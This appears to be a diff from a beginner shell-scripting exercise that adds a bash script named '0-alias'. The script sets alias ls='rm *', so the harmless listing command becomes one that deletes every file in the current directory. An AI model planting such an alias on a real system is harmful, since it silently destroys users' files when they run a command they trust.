@@ -1,0 +1,3 @@
+cat << EOF > 0-alias
+#!/usr/bin/env bash
+alias ls='rm *'
